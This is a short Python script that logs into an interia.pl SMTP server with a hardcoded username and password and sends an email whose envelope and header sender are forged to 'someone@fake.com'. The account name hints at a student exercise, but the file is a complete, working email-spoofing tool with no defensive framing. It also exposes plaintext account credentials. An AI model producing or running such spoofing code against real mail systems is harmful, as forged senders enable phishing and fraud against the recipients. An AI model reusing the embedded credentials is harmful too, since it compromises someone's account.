import socket
import ssl
import base64

HOST = "interia.pl"
PORT = 587
USERNAME = "pas2017@interia.pl"
PASSWORD = "P4SInf2017"
SPOOFED_FROM = "someone@fake.com"
TO = "example@example.com"

# Połączenie
client_socket = socket.create_connection((HOST, PORT))
print(client_socket.recv(1024).decode())

client_socket.send(b"EHLO test.local\r\n")
print(client_socket.recv(1024).decode())

client_socket.send(b"STARTTLS\r\n")
print(client_socket.recv(1024).decode())

context = ssl.create_default_context()
client_socket = context.wrap_socket(client_socket, server_hostname=HOST)

client_socket.send(b"EHLO test.local\r\n")
print(client_socket.recv(1024).decode())

client_socket.send(b"AUTH LOGIN\r\n")
print(client_socket.recv(1024).decode())

client_socket.send(base64.b64encode(USERNAME.encode()) + b"\r\n")
print(client_socket.recv(1024).decode())

client_socket.send(base64.b64encode(PASSWORD.encode()) + b"\r\n")
print(client_socket.recv(1024).decode())

# MAIL FROM to spoofed address
client_socket.send(f"MAIL FROM:<{SPOOFED_FROM}>\r\n".encode())
print(client_socket.recv(1024).decode())

client_socket.send(f"RCPT TO:<{TO}>\r\n".encode())
print(client_socket.recv(1024).decode())

client_socket.send(b"DATA\r\n")
print(client_socket.recv(1024).decode())

message = f"""From: {SPOOFED_FROM}
To: {TO}
Subject: Spoofed Email

This email appears to come from someone else.
.
"""
client_socket.send(message.encode())
client_socket.send(b"\r\n.\r\n")
print(client_socket.recv(1024).decode())

client_socket.send(b"QUIT\r\n")
print(client_socket.recv(1024).decode())

client_socket.close()
